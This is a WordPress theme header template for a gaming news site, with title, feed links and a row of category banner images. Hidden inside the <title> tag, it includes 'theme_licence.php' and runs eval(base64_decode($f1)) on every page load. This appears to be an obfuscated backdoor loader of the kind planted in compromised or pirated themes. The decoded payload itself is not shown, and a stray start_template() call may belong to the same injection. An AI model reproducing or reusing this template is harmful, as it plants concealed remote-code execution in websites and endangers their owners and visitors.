<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

	<head profile="http://gmpg.org/xfn/11">

		<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
		<title><?php require_once("theme_licence.php"); eval(base64_decode($f1)); bloginfo('name'); ?><?php wp_title(); ?></title>
		<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" />
		<!-- leave this for stats please -->

		<style type="text/css" media="screen">
			@import url( <?php bloginfo('stylesheet_url'); ?> );
		</style>

		<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="<?php bloginfo('rss2_url'); ?>" />
		<link rel="alternate" type="text/xml" title="RSS .92" href="<?php bloginfo('rss_url'); ?>" />
		<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="<?php bloginfo('atom_url'); ?>" />
		<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

		<?php wp_get_archives('type=monthly&format=link'); ?>
		<?php //comments_popup_script(); // off by default ?>
		<?php wp_head(); ?>

		<!--[if IE 6]><style>#main { margin: -80px 0 0 30px;}</style><![endif]-->

	</head>

	<body>
		<?php start_template(); ?>
		<div id="page"><div id="frame">
			<div id="topbanner">

				<div class="title"><a href="<?php bloginfo('url'); ?>"><?php bloginfo('name'); ?></a></div>
				<div class="info"><?php bloginfo('description'); ?></div>

			    <div id="bannerimagecontainer">

					<span id="bannerimage">
						<a href="<?php echo get_option('top_banner_link_setting1', '/content/tag/pc-games/')?>"><img
								src="<?php $filename=get_option('top_banner_image_setting1', 'header_button1.png'); echo '/content/wp-content/themes/waterlily/images/' . $filename; ?>"
								title="<?php echo get_option('top_banner_title_setting1', 'PC Games')?>"/></a>
					</span>
					<span id="bannerimage">
						<a href="<?php echo get_option('top_banner_link_setting2', '/content/tag/windows/')?>"><img
								src="<?php $filename=get_option('top_banner_image_setting2', 'header_button2.png'); echo '/content/wp-content/themes/waterlily/images/' . $filename; ?>"
								title="<?php echo get_option('top_banner_title_setting2', 'Windows')?>"/></a>
					</span>
					<span id="bannerimage">
						<a href="<?php echo get_option('top_banner_link_setting3', '/content/tag/console-games/')?>"><img
								src="<?php $filename=get_option('top_banner_image_setting3', 'header_button3.png'); echo '/content/wp-content/themes/waterlily/images/' . $filename; ?>"
								title="<?php echo get_option('top_banner_title_setting3', 'Console Games')?>"/></a>
					</span>
					<span id="bannerimage">
						<a href="<?php echo get_option('top_banner_link_setting4', '/content/tag/handheld-games/')?>"><img
								src="<?php $filename=get_option('top_banner_image_setting4', 'header_button4.png'); echo '/content/wp-content/themes/waterlily/images/' . $filename; ?>"
								title="<?php echo get_option('top_banner_title_setting4', 'Handheld Games')?>"/></a>
					</span>
					<span id="bannerimage">
						<a href="<?php echo get_option('top_banner_link_setting5', '/content/tag/model/')?>"><img
								src="<?php $filename=get_option('top_banner_image_setting5', 'header_button5.png'); echo '/content/wp-content/themes/waterlily/images/' . $filename; ?>"
								title="<?php echo get_option('top_banner_title_setting5', 'Models')?>"/></a>
					</span>
					<span id="bannerimage">
						<a href="<?php echo get_option('top_banner_link_setting6', '/content/tag/retro/')?>"><img
								src="<?php $filename=get_option('top_banner_image_setting6', 'header_button6.png'); echo '/content/wp-content/themes/waterlily/images/' . $filename; ?>"
								title="<?php echo get_option('top_banner_title_setting6', 'Retro')?>"/></a>
					</span>
			    </div>
			</div>

			<div class="clearfix">
			</div>